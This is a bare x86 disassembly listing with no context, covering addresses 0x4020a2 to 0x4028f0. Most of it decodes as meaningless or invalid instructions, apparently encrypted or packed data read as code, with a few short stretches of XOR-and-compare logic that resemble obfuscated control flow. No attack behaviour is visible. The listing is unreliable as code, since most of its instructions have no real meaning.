  4020a2:	pop    ds
  4020a3:	jno    0x40209d
  4020a5:	sub    eax,ebx
  4020a7:	call   0xee63:0x7db5f6c5
  4020ae:	popa   
  4020af:	sub    edi,DWORD PTR [edx]
  4020b1:	mov    WORD PTR [edi],ss
  4020b3:	sub    BYTE PTR [ebp-0x22],0x53
  4020b7:	push   eax
  4020b8:	mov    ch,0x2e
  4020ba:	xchg   ebp,eax
  4020bb:	mov    dl,0xe5
  4020bd:	scas   eax,DWORD PTR es:[edi]
  4020be:	cwde   
  4020bf:	sub    ch,BYTE PTR [ecx-0x528f6868]
  4020c5:	paddb  mm6,QWORD PTR [edx-0x2a488db3]
  4020cc:	and    al,0x85
  4020ce:	(bad)  
  4020d0:	adc    eax,0x4c7cfc86
  4020d5:	push   edx
  4020d6:	push   0xffffffb7
  4020d8:	arpl   cx,cx
  4020da:	(bad)  
  4020dc:	ins    BYTE PTR es:[edi],dx
  4020dd:	pop    edx
  4020de:	std    
  4020df:	mov    ebp,DWORD PTR [ebx+0x29]
  4020e2:	mov    cl,0xb0
  4020e4:	fwait
  4020e5:	push   ds
  4020e6:	mov    edi,0x799d9d88
  4020eb:	inc    edi
  4020ec:	jb     0x40209a
  4020ee:	test   DWORD PTR [edx+ebp*4+0x76],esi
  4020f2:	(bad)  
  4020f3:	pop    edi
  4020f4:	imul   ecx,DWORD PTR ds:0x534f43fa,0xf56c49ba
  4020fe:	jmp    0xd0594c3a
  402103:	or     edi,eax
  402105:	lock pop edx
  402107:	adc    DWORD PTR [edx+0x55],esi
  40210a:	pop    edx
  40210b:	aas    
  40210c:	(bad)  
  40210d:	mov    ah,0x1d
  40210f:	mov    eax,0xec4e5847
  402114:	cmp    ch,BYTE PTR [edi+0x254e234a]
  40211a:	and    BYTE PTR [ebp*4+0x2a0ec143],bh
  402121:	(bad)  
  402122:	pop    ebx
  402123:	mov    cl,0xf4
  402125:	sub    eax,0x155b7d70
  40212a:	push   ecx
  40212b:	cmp    al,0x1b
  40212d:	popa   
  40212e:	jb     0x402123
  402130:	mov    cl,0xad
  402132:	pop    ebp
  402133:	sub    ah,al
  402135:	sub    al,0xe4
  402137:	jp     0x4020c8
  402139:	test   DWORD PTR [edi-0x57a1efd1],0x3fb47626
  402143:	jo     0x4020c9
  402145:	cmp    esp,0xd9692d80
  40214b:	xor    edx,DWORD PTR [ecx+0x35]
  40214e:	jnp    0x4020e6
  402150:	mov    ?,edi
  402152:	and    al,0x15
  402154:	into   
  402155:	sub    ecx,ecx
  402157:	in     eax,dx
  402158:	sbb    eax,0xd6778c19
  40215d:	sub    eax,0x1a5d56f4
  402162:	push   edi
  402163:	pop    ebx
  402164:	and    BYTE PTR [eax],dl
  402166:	bound  edi,QWORD PTR [esi+0x7226a397]
  40216c:	add    DWORD PTR [ebx-0x51b8d3f1],edx
  402172:	jns    0x402125
  402174:	in     eax,dx
  402175:	std    
  402176:	and    DWORD PTR [ebx],eax
  402178:	(bad)  
  402179:	cs push 0x9ac12589
  40217f:	addr16 cs mov ecx,0xce0b3815
  402186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402187:	mov    al,ds:0x964c9698
  40218c:	fadd   DWORD PTR [ebx-0x30]
  40218f:	mov    edi,0xb7971d7a
  402194:	add    al,0x27
  402196:	retf   0x773c
  402199:	inc    edi
  40219a:	sub    eax,0x3e17c593
  40219f:	dec    ebx
  4021a0:	ja     0x4021f6
  4021a2:	shr    DWORD PTR [edi-0x10],cl
  4021a5:	push   edi
  4021a6:	sbb    esp,ecx
  4021a8:	loop   0x4021e2
  4021aa:	mov    al,0xa5
  4021ac:	fsubr  DWORD PTR [esp+edx*1-0x4f62d02e]
  4021b3:	dec    eax
  4021b4:	(bad)  
  4021b5:	dec    edi
  4021b6:	in     al,0xdd
  4021b8:	out    dx,eax
  4021b9:	hlt    
  4021ba:	inc    ebp
  4021bb:	mov    dh,cl
  4021bd:	push   ebp
  4021be:	pop    eax
  4021bf:	neg    DWORD PTR [edx]
  4021c1:	or     al,0x59
  4021c3:	popf   
  4021c4:	cmp    ecx,DWORD PTR [eax+0x56]
  4021c7:	jo     0x4021e8
  4021c9:	arpl   WORD PTR [edi-0xe2a736f],ax
  4021cf:	jae    0x4021b5
  4021d1:	fmul   DWORD PTR [eax+esi*4+0x5aeeef62]
  4021d8:	test   al,0x7e
  4021da:	cli    
  4021db:	loop   0x4021cd
  4021dd:	and    edi,DWORD PTR [ebp+0x5b250ee3]
  4021e3:	enter  0x3e04,0x55
  4021e7:	cmp    eax,0x40bfc220
  4021ec:	sub    al,0xc3
  4021ee:	setne  BYTE PTR [esi-0x6a8098bd]
  4021f5:	test   DWORD PTR [esi+0x7d178f4],0x3f56b5d3
  4021ff:	loopne 0x4021b4
  402201:	fs jne 0x402280
  402204:	sub    eax,0x4ee3cd6a
  402209:	cld    
  40220a:	shr    DWORD PTR [esi],cl
  40220c:	jne    0x40223b
  40220e:	jmp    0x57aa:0x181c3f6f
  402215:	add    eax,0xb5e30e93
  40221a:	sub    eax,0xb5307d4f
  40221f:	or     DWORD PTR [eax-0x44d03a77],edi
  402225:	mov    bh,0xed
  402227:	mov    cs,WORD PTR [ebp+0x4b]
  40222a:	out    dx,al
  40222b:	rol    DWORD PTR ds:0xd011f94b,1
  402231:	imul   ebp,DWORD PTR [edx-0x8],0x4d
  402235:	pop    ebx
  402236:	add    al,0xde
  402238:	fist   WORD PTR [eax+0x7d332b8a]
  40223e:	in     eax,dx
  40223f:	xor    edx,edx
  402241:	jmp    0x92:0xe994c949
  402248:	outs   dx,BYTE PTR ds:[esi]
  402249:	lods   al,BYTE PTR ds:[esi]
  40224a:	sub    ecx,0xffffffc0
  40224d:	ret    
  40224e:	stos   BYTE PTR es:[edi],al
  40224f:	xchg   ecx,eax
  402250:	inc    edi
  402251:	sar    BYTE PTR [edi+ebp*8],cl
  402254:	and    DWORD PTR [edi+edx*8+0x78],ecx
  402258:	shl    BYTE PTR [edi+0x46],0xb0
  40225c:	cmp    esi,edx
  40225e:	mov    ?,WORD PTR [ebp+0x6ef22b44]
  402264:	rcr    ecx,0xe1
  402267:	das    
  402268:	into   
  402269:	dec    edx
  40226a:	xchg   esp,eax
  40226b:	std    
  40226c:	cmp    al,0xb1
  40226e:	and    ecx,DWORD PTR [ebp+0x4c]
  402271:	and    bh,BYTE PTR [ebp+0x33]
  402274:	les    edi,FWORD PTR [ebx]
  402276:	je     0x4026fd
  40227c:	mov    eax,DWORD PTR [ebp-0x14]
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [edx+0x45],ebx
  40229c:	popf   
  40229d:	shl    DWORD PTR [eax+0x2],1
  4022a0:	jo     0x402312
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	and    bh,bh
  4022a8:	int    0x1d
  4022aa:	pop    esp
  4022ab:	clc    
  4022ac:	dec    esi
  4022ad:	mov    edi,0xcb9c3a1b
  4022b2:	gs hlt 
  4022b4:	add    al,0x40
  4022b6:	out    0x5,al
  4022b8:	xchg   BYTE PTR [esp+eax*4+0x58],al
  4022bc:	into   
  4022bd:	(bad)  
  4022be:	scas   eax,DWORD PTR es:[edi]
  4022bf:	xor    al,0xaa
  4022c1:	sbb    edx,edx
  4022c3:	out    dx,eax
  4022c4:	in     al,0x79
  4022c6:	ins    BYTE PTR es:[edi],dx
  4022c7:	xor    eax,0x8c01719d
  4022cc:	pop    ds
  4022cd:	(bad)  [ecx-0x42]
  4022d0:	(bad)  
  4022d2:	neg    DWORD PTR [edi-0x71]
  4022d5:	fisub  DWORD PTR [ecx]
  4022d7:	cmp    cl,BYTE PTR [eax]
  4022d9:	int3   
  4022da:	dec    eax
  4022db:	dec    esp
  4022dc:	in     al,dx
  4022dd:	retf   0xf5b6
  4022e0:	outs   dx,DWORD PTR ds:[esi]
  4022e1:	mov    DWORD PTR [ecx-0x42],0xb87412a0
  4022e8:	pop    es
  4022e9:	and    eax,0xd195ab56
  4022ee:	jnp    0x402333
  4022f0:	lea    ebp,[edx+0x41]
  4022f3:	pop    es
  4022f4:	cmp    edi,DWORD PTR [edi+0x634ff2a4]
  4022fa:	jge    0x4022b7
  4022fc:	push   0xae0bbee1
  402301:	in     eax,0xc9
  402303:	or     edi,DWORD PTR [edi+0x4a]
  402306:	xor    bh,BYTE PTR [esi+0x35afa3fa]
  40230c:	(bad)
  40230f:	aaa    
  402310:	aas    
  402311:	je     0x40230c
  402313:	sbb    BYTE PTR [eax+0x74],al
  402316:	mov    ds:0x5886005c,eax
  40231b:	xor    al,0x2c
  40231d:	cmc    
  40231e:	jb     0x402391
  402320:	shr    DWORD PTR [esi],1
  402322:	ins    DWORD PTR es:[edi],dx
  402323:	std    
  402324:	in     eax,0x9b
  402326:	loopne 0x4022fe
  402328:	nop
  402329:	inc    ebp
  40232a:	adc    edx,DWORD PTR [eax+0x30]
  40232d:	xor    BYTE PTR [edx],0x27
  402330:	test   al,0x6
  402332:	push   ds
  402333:	and    ebp,DWORD PTR [esi-0x5441ad68]
  402339:	adc    cl,BYTE PTR [esi-0x737957b9]
  40233f:	sub    DWORD PTR [eax+0x61],ebp
  402342:	xchg   ebp,eax
  402343:	cmc    
  402344:	and    BYTE PTR [edi-0x36246bab],ch
  40234a:	cmp    DWORD PTR [edi+esi*2],esi
  40234d:	and    ebx,esp
  40234f:	mov    esp,0xa790157f
  402354:	loopne 0x4022fb
  402356:	repnz and BYTE PTR [ebp+0x5c],ch
  40235a:	jge    0x40237e
  40235c:	and    eax,0x42b72bf3
  402361:	sub    al,0x8f
  402363:	fidivr WORD PTR ds:0x496d346d
  402369:	int    0x6e
  40236b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40236c:	repz int 0x6c
  40236f:	jo     0x4023c5
  402371:	sbb    al,0xa9
  402373:	pushf  
  402374:	cmp    al,0x80
  402376:	es sti 
  402378:	aad    0xa1
  40237a:	xor    eax,esi
  40237c:	stos   DWORD PTR es:[edi],eax
  40237d:	fcomp  QWORD PTR [ebp+0x21]
  402380:	xor    eax,0x409868cc
  402385:	jae    0x4023bb
  402387:	jmp    0x8a5b8fbc
  40238c:	and    DWORD PTR [ebx+0x14],0xc2fbf417
  402393:	push   ecx
  402394:	fstp   DWORD PTR [edx]
  402396:	not    BYTE PTR [esi]
  402398:	cmp    ch,BYTE PTR [edi+0x70]
  40239b:	es push ebx
  40239d:	dec    esi
  40239e:	pop    edi
  40239f:	adc    al,bl
  4023a1:	sbb    DWORD PTR [esi+eiz*8+0x3b],edi
  4023a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023a6:	xchg   edi,eax
  4023a7:	inc    edx
  4023a8:	push   ebx
  4023a9:	rcr    DWORD PTR es:[ecx+edx*8-0x1e7bd550],cl
  4023b1:	js     0x402347
  4023b3:	aam    0x33
  4023b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023b6:	dec    ecx
  4023b7:	test   BYTE PTR [esi],cl
  4023b9:	cdq    
  4023ba:	jns    0x402431
  4023bc:	js     0x402356
  4023be:	jecxz  0x40235d
  4023c0:	or     BYTE PTR [edi+0x529c8ca0],ah
  4023c6:	sub    DWORD PTR [ebp+0x6b49a83c],edx
  4023cc:	out    dx,al
  4023cd:	loope  0x402366
  4023cf:	fs cli 
  4023d1:	xlat   BYTE PTR ds:[ebx]
  4023d2:	out    0x28,eax
  4023d4:	mov    al,ds:0x48429125
  4023d9:	and    eax,0x9af35e3f
  4023de:	mov    ebp,0x97ad895d
  4023e3:	adc    eax,0x33a3d773
  4023e8:	push   0x2493ab3e
  4023ed:	sbb    ecx,0xffffffc7
  4023f0:	jnp    0x40240e
  4023f2:	fld    TBYTE PTR [ecx-0x73]
  4023f5:	add    BYTE PTR [eax+eax*1+0x40],ch
  4023f9:	cld    
  4023fa:	sub    eax,0xc6e182ec
  4023ff:	sub    al,0x71
  402401:	add    bl,BYTE PTR [ebx]
  402403:	sbb    edi,DWORD PTR gs:[edi+0x24]
  402407:	jmp    0x40242e
  402409:	std    
  40240a:	sub    ebp,DWORD PTR [eax]
  40240c:	mov    ds:0xa49fd648,eax
  402411:	lahf   
  402412:	jp     0x402475
  402414:	(bad)  
  402415:	push   edx
  402416:	push   ds
  402417:	jmp    0xc256:0x2aa8aace
  40241e:	sti    
  40241f:	pop    edx
  402420:	lock out dx,eax
  402422:	pop    edi
  402423:	mov    esp,0xae4b4a72
  402428:	and    BYTE PTR [ecx+0x78],bl
  40242b:	inc    esp
  40242c:	sahf   
  40242d:	lods   al,BYTE PTR ds:[esi]
  40242e:	mov    ecx,0x92ac3500
  402433:	sbb    BYTE PTR [ecx],dh
  402435:	cli    
  402436:	pop    esp
  402437:	jbe    0x40248b
  402439:	cmp    DWORD PTR [edi],ebp
  40243b:	cmp    ebx,esi
  40243d:	inc    ecx
  40243e:	dec    eax
  40243f:	jbe    0x402410
  402441:	stos   BYTE PTR es:[edi],al
  402442:	sub    DWORD PTR [ecx],ebp
  402444:	adc    bl,ah
  402446:	adc    dl,dh
  402448:	pushf  
  402449:	mov    eax,0x5bbf67ae
  40244e:	jae    0x40242a
  402450:	test   al,0xe3
  402452:	pop    edi
  402453:	or     edx,DWORD PTR [ebx+ebp*1+0x44]
  402457:	xchg   ecx,eax
  402458:	mov    dh,0x7
  40245a:	clc    
  40245b:	mov    edi,0x21724302
  402460:	test   eax,0x9796ac78
  402465:	jne    0x402467
  402467:	out    0xfe,eax
  402469:	out    dx,al
  40246a:	retf   
  40246b:	in     al,0x84
  40246d:	dec    edx
  40246e:	add    ebp,DWORD PTR [ebp-0x3f49a2da]
  402474:	ds stos BYTE PTR es:[edi],al
  402476:	les    esi,FWORD PTR [ecx-0x5a20d5db]
  40247c:	sub    eax,0xde7cc334
  402481:	fstp   DWORD PTR [edi]
  402483:	dec    ecx
  402484:	add    eax,0xdb1f15aa
  402489:	cmc    
  40248a:	push   0x2
  40248c:	aad    0x9a
  40248e:	add    cl,BYTE PTR [ebx-0x6bd06a35]
  402494:	or     BYTE PTR [ebp+eax*8+0x45],bl
  402498:	bnd jmp 0x946cd46b
  40249e:	mov    ebx,0x872e1b8f
  4024a3:	(bad)
  4024a9:	enter  0x3ebb,0x8a
  4024ad:	add    BYTE PTR [eax],al
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx+0x7400fe37],cl
  4024f4:	shl    DWORD PTR [eax+0x0],0x70
  4024f8:	jo     0x40256a
  4024fa:	jle    0x40256c
  4024fc:	jo     0x402545
  4024fe:	ss imul edi,ecx,0x40
  402502:	mov    edi,0x28984a23
  402507:	bound  ebx,QWORD PTR ds:0xb8fba77c
  40250d:	sub    eax,0xaf276937
  402512:	add    al,0x27
  402514:	pop    edi
  402515:	stc    
  402516:	dec    ecx
  402517:	icebp  
  402518:	idiv   BYTE PTR [esi-0x6ce37ec6]
  40251e:	(bad)  
  40251f:	dec    eax
  402520:	mov    DWORD PTR [ebp+0x67f7858f],esi
  402526:	fst    DWORD PTR [esi+0x57aef68e]
  40252c:	(bad)  
  40252e:	out    0xb3,eax
  402530:	shl    cl,1
  402532:	call   0xf9af:0x39d1d386
  402539:	rcl    BYTE PTR [ebx+0x68],cl
  40253c:	icebp  
  40253d:	and    eax,0x3b54dc0a
  402542:	inc    ebp
  402543:	mov    WORD PTR fs:0x1bbdaab0,es
  40254a:	test   DWORD PTR [edx],ebx
  40254c:	ja     0x4024e3
  40254e:	int    0x65
  402550:	and    DWORD PTR [ecx-0x188660eb],ecx
  402556:	jmp    0xf6e9:0xe74e3d6
  40255d:	jmp    FWORD PTR [eax]
  40255f:	fisubr DWORD PTR [eax+0x8]
  402562:	xor    BYTE PTR [ebx+0x6c],ch
  402565:	sahf   
  402566:	adc    BYTE PTR [edx],dl
  402568:	pop    ds
  402569:	xor    BYTE PTR [edi],dl
  40256b:	fwait
  40256c:	outs   dx,BYTE PTR ds:[esi]
  40256d:	cdq    
  40256e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40256f:	out    0x93,eax
  402571:	enter  0xef84,0xd5
  402575:	stc    
  402576:	xchg   esi,eax
  402577:	jns    0x4025b0
  402579:	adc    DWORD PTR [ecx-0x3a6da3e5],esp
  40257f:	adc    eax,0xd8745adb
  402584:	dec    esi
  402585:	in     eax,0x18
  402587:	xor    BYTE PTR [esi-0x1662841],0x2
  40258e:	push   es
  40258f:	jecxz  0x402589
  402591:	push   esi
  402592:	sar    BYTE PTR [edx+0x61],0xa4
  402596:	lds    ebx,FWORD PTR [ebx+0xb471c61]
  40259c:	adc    al,0xbe
  40259e:	sub    eax,0x823bd7c7
  4025a3:	lea    ebx,[eax-0x8]
  4025a6:	or     eax,DWORD PTR [esi-0x4c]
  4025a9:	push   esi
  4025aa:	pushf  
  4025ab:	pop    esi
  4025ac:	mov    DWORD PTR [esi+esi*2],edx
  4025af:	push   ebx
  4025b0:	ret    
  4025b1:	mov    ds:0x8b3de559,al
  4025b6:	stos   DWORD PTR es:[edi],eax
  4025b7:	in     al,dx
  4025b8:	imul   DWORD PTR [ebx-0x1f]
  4025bb:	adc    bl,BYTE PTR [edi]
  4025bd:	fst    DWORD PTR [edi+eiz*4-0x5f4bc058]
  4025c4:	cmc    
  4025c5:	setl   BYTE PTR [ecx+0x7c]
  4025c9:	push   eax
  4025ca:	dec    esp
  4025cb:	out    dx,al
  4025cc:	test   dh,0x87
  4025cf:	idiv   cl
  4025d1:	jg     0x402637
  4025d3:	arpl   dx,sp
  4025d5:	mov    eax,ds:0x2c15022d
  4025da:	lock call 0x9f07:0xd1d814cb
  4025e2:	aam    0x65
  4025e4:	or     eax,0xe0ba64af
  4025e9:	or     BYTE PTR [esi+0x1e],cl
  4025ec:	jno    0x4025ca
  4025ee:	pop    ebp
  4025ef:	(bad)  
  4025f0:	lea    esp,[eax-0xe]
  4025f3:	add    eax,0xceb6ab55
  4025f8:	mov    ch,0x66
  4025fa:	mov    ds:0x2d461710,al
  4025ff:	inc    esp
  402600:	cmp    ch,BYTE PTR [eax-0x4007e1fd]
  402606:	sub    BYTE PTR [ecx-0x1284fea7],al
  40260c:	sub    DWORD PTR [ebp-0x31],0xda65a59f
  402613:	push   esp
  402614:	push   ss
  402615:	in     eax,0xaf
  402617:	inc    ecx
  402618:	and    bl,0x79
  40261b:	loop   0x402623
  40261d:	out    dx,al
  40261e:	nop
  40261f:	push   ebx
  402620:	clc    
  402621:	xor    dh,dh
  402623:	imul   eax,edi,0x69
  402626:	inc    ebx
  402627:	mov    ecx,0x5491efea
  40262c:	icebp  
  40262d:	sbb    al,0x1d
  40262f:	aaa    
  402630:	dec    esp
  402631:	add    bl,BYTE PTR [edi-0x2a]
  402634:	push   ebx
  402635:	ins    DWORD PTR es:[edi],dx
  402636:	sbb    bh,cl
  402638:	call   0xcb2b:0xc6c9529c
  40263f:	pop    edi
  402640:	adc    BYTE PTR [di],al
  402643:	sti    
  402644:	mov    BYTE PTR [esi],0xfa
  402647:	xchg   esi,eax
  402648:	lea    eax,[ecx]
  40264a:	xor    eax,0xeced1cab
  40264f:	js     0x40265d
  402651:	sbb    eax,0x3b830d3f
  402656:	xchg   ecx,eax
  402657:	ja     0x402696
  402659:	adc    ebp,ecx
  40265b:	cdq    
  40265c:	shl    BYTE PTR [eax-0x4e],0xa8
  402660:	fnstsw WORD PTR [edi-0x2c]
  402663:	xlat   BYTE PTR ds:[ebx]
  402664:	mov    dh,BYTE PTR [esp+eax*1-0x36]
  402668:	cmc    
  402669:	dec    edx
  40266a:	jnp    0x40269c
  40266c:	dec    edi
  40266d:	inc    ebp
  40266e:	dec    ebx
  40266f:	push   0xffffffb2
  402671:	fld    TBYTE PTR [eax]
  402673:	(bad)  [edx-0x6e]
  402676:	push   ss
  402677:	mov    ds:0xfdb3bd1d,eax
  40267c:	lods   al,BYTE PTR ds:[esi]
  40267d:	xchg   edi,eax
  40267e:	mov    cs,WORD PTR [esi]
  402680:	leave  
  402681:	jmp    0x4026ad
  402683:	dec    ecx
  402684:	jp     0x402637
  402686:	daa    
  402687:	mov    ebp,0xd8488ad8
  40268c:	sbb    ch,BYTE PTR [ebx-0x92f84ac]
  402692:	lods   eax,DWORD PTR ds:[esi]
  402693:	push   ebp
  402694:	clc    
  402695:	pusha  
  402696:	mov    bl,0xa6
  402698:	and    BYTE PTR [ebp+0x69],dh
  40269b:	test   ebx,esi
  40269d:	in     eax,dx
  40269e:	lock stos DWORD PTR es:[edi],eax
  4026a0:	ss ds and eax,0x2b463072
  4026a7:	mov    ds:0xfd88933c,al
  4026ac:	jnp    0x4026f0
  4026ae:	mov    bl,0x2f
  4026b0:	jmp    0x4026b2
  4026b2:	dec    edx
  4026b3:	add    BYTE PTR [edx-0x6e9082ae],bl
  4026b9:	jle    0x402715
  4026bb:	dec    edi
  4026bc:	mov    eax,ds:0x28d9ae54
  4026c1:	adc    eax,0x3475c967
  4026c6:	pop    es
  4026c7:	xchg   esi,eax
  4026c8:	sahf   
  4026c9:	ins    BYTE PTR es:[edi],dx
  4026ca:	cmovle esp,DWORD PTR [esi]
  4026cd:	(bad)  
  4026ce:	cmp    al,0x48
  4026d0:	in     eax,dx
  4026d1:	bound  ebp,QWORD PTR [ecx-0x65173d48]
  4026d7:	and    al,0x6e
  4026d9:	mov    al,0xc9
  4026db:	push   edx
  4026dc:	nop
  4026dd:	mov    dl,0x2c
  4026df:	loop   0x4026b3
  4026e1:	mov    edx,0x297f923b
  4026e6:	lds    esp,FWORD PTR [eax]
  4026e8:	push   0xb962d983
  4026ed:	cmp    BYTE PTR [edi],al
  4026ef:	call   0xc060:0x3a5fff4d
  4026f6:	fidiv  WORD PTR [edi]
  4026f8:	mov    eax,ds:0x7c4de502
  4026fd:	mov    eax,DWORD PTR [ebp-0xc]
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0x74ec0301
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	call   0xda74:0x8520e5e9
  40276e:	cld    
  40276f:	mov    dl,0x3e
  402771:	out    dx,eax
  402772:	ds jmp 0x4027eb
  402775:	dec    esi
  402776:	out    0x49,al
  402778:	retf   0xbf23
  40277b:	(bad)  ds:0x89f5971e
  402781:	fdiv   QWORD PTR [edi-0x576aa562]
  402787:	int    0x45
  402789:	ret    
  40278a:	and    ecx,0xffffff9d
  40278d:	sbb    al,0x30
  40278f:	js     0x4027fc
  402791:	push   edx
  402792:	sbb    cl,bh
  402794:	or     al,0xc
  402796:	mov    dl,0x58
  402798:	sub    al,0x7f
  40279a:	xchg   ecx,eax
  40279b:	mov    DWORD PTR [edi+0x64],ecx
  40279e:	ror    BYTE PTR [eax+edi*8-0x2],cl
  4027a2:	outs   dx,DWORD PTR ds:[esi]
  4027a3:	hlt    
  4027a4:	shl    BYTE PTR [ebp-0x57c7f675],1
  4027aa:	mov    ecx,0x2e57b404
  4027af:	mov    dh,0x59
  4027b1:	jo     0x4027d5
  4027b3:	into   
  4027b4:	sub    dh,BYTE PTR [ecx+ebp*1]
  4027b7:	(bad)  
  4027b8:	enter  0x5c3b,0xd7
  4027bc:	jp     0x4027fc
  4027be:	mov    bh,0x6
  4027c0:	inc    ecx
  4027c1:	out    0x7c,eax
  4027c3:	aam    0xa
  4027c5:	fwait
  4027c6:	cmc    
  4027c7:	les    ebp,FWORD PTR [esi*4-0x6106026d]
  4027ce:	mov    edi,0x8323cf70
  4027d3:	pop    ebx
  4027d4:	or     ch,bh
  4027d6:	sahf   
  4027d7:	mov    ebx,0x569ebefc
  4027dc:	and    BYTE PTR [edi+0x4e],ah
  4027df:	pusha  
  4027e0:	loope  0x402844
  4027e2:	lea    ebx,[edx]
  4027e4:	jmp    0x40280b
  4027e6:	ins    DWORD PTR es:[edi],dx
  4027e7:	xlat   BYTE PTR ds:[ebx]
  4027e8:	add    BYTE PTR [ebp+edi*8+0x6e316133],ah
  4027ef:	(bad)  
  4027f0:	or     si,WORD PTR [ebp-0x65]
  4027f4:	jg     0x402814
  4027f6:	test   DWORD PTR [esi-0x2e590f5b],ecx
  4027fc:	stc    
  4027fd:	sbb    ebp,DWORD PTR [eax+ebx*4+0x1e]
  402801:	aad    0xa0
  402803:	mov    eax,0x39312b6d
  402808:	(bad)  
  402809:	push   esp
  40280a:	inc    ecx
  40280b:	push   cs
  40280c:	neg    BYTE PTR [eax+0x7e]
  40280f:	aaa    
  402810:	mov    WORD PTR [edx+eiz*2],ds
  402813:	push   ds
  402814:	or     ebp,DWORD PTR [esp+ebx*2-0x5971080f]
  40281b:	repnz sub eax,edx
  40281e:	test   al,0x9f
  402820:	adc    cl,BYTE PTR [ebx]
  402822:	push   ebp
  402823:	cmp    dl,bl
  402825:	mov    edi,0x4af7b739
  40282a:	jmp    0xa460ae86
  40282f:	xor    edi,DWORD PTR [ecx-0x6f]
  402832:	push   esi
  402833:	ins    BYTE PTR es:[edi],dx
  402834:	xchg   BYTE PTR [ebp-0x1c34ee0],bh
  40283a:	or     dh,dh
  40283c:	sub    bl,bl
  40283e:	ror    BYTE PTR [eax+0xd37ca5f],cl
  402844:	xchg   ecx,eax
  402845:	jmp    0xd32f:0xbebccb3c
  40284c:	retf   
  40284d:	inc    ecx
  40284e:	jp     0x4028be
  402850:	stos   BYTE PTR es:[edi],al
  402851:	or     DWORD PTR [ecx-0x726f08d8],eax
  402857:	mov    ds:0x40e85647,al
  40285c:	outs   dx,BYTE PTR ds:[esi]
  40285d:	mov    ebx,0x6069a4f8
  402862:	nop
  402863:	pop    ds
  402864:	imul   ebp,DWORD PTR [ebp+0x4043886d],0xffffffbe
  40286b:	dec    eax
  40286c:	mov    ebp,0x19fa642b
  402871:	jmp    0x402898
  402873:	push   ds
  402874:	xor    ebp,edx
  402876:	in     al,dx
  402877:	push   edi
  402878:	mov    ebx,0xbcf5a084
  40287d:	mov    bh,0x62
  40287f:	fild   DWORD PTR [eax+0x19adacfe]
  402885:	lds    esp,FWORD PTR [eax]
  402887:	dec    edx
  402888:	pop    edx
  402889:	daa    
  40288a:	xor    ecx,DWORD PTR [ebx+0x54d42786]
  402890:	push   esi
  402891:	push   0x9fb6b6b
  402896:	inc    ecx
  402897:	in     eax,0x2b
  402899:	fdiv   DWORD PTR [edi-0x34]
  40289c:	sbb    al,0xc8
  40289e:	test   BYTE PTR [edi+ebx*2],bh
  4028a1:	retf   0xe138
  4028a4:	xor    dh,BYTE PTR [edx+0x1c]
  4028a7:	adc    al,0xdc
  4028a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028aa:	dec    edx
  4028ab:	test   eax,0xe951272d
  4028b0:	cmp    ebp,esi
  4028b2:	lea    ecx,[ebx]
  4028b4:	aaa    
  4028b5:	scas   eax,DWORD PTR es:[edi]
  4028b6:	ins    BYTE PTR es:[edi],dx
  4028b7:	mov    ds:0x63b58d70,al
  4028bc:	pop    edx
  4028bd:	or     edi,DWORD PTR [edx-0x40]
  4028c0:	jp     0x40286a
  4028c2:	jmp    0x2b6f:0x44908ab8
  4028c9:	sahf   
  4028ca:	sub    esp,edx
  4028cc:	xor    edx,DWORD PTR [ebx]
  4028ce:	pop    ebp
  4028cf:	std    
  4028d0:	inc    ecx
  4028d1:	sbb    eax,0x2c1efba5
  4028d6:	and    eax,DWORD PTR [ebp+0x1c]
  4028d9:	jle    0x402949
  4028db:	(bad)  
  4028dc:	add    ah,dl
  4028de:	ss es enter 0x2c0b,0x93
  4028e4:	les    edi,FWORD PTR [ecx]
  4028e6:	add    bh,BYTE PTR [ebx+0x58]
  4028e9:	pop    ecx
  4028ea:	dec    eax
  4028eb:	mov    eax,0xebeb02f1
  4028f0:	hlt    
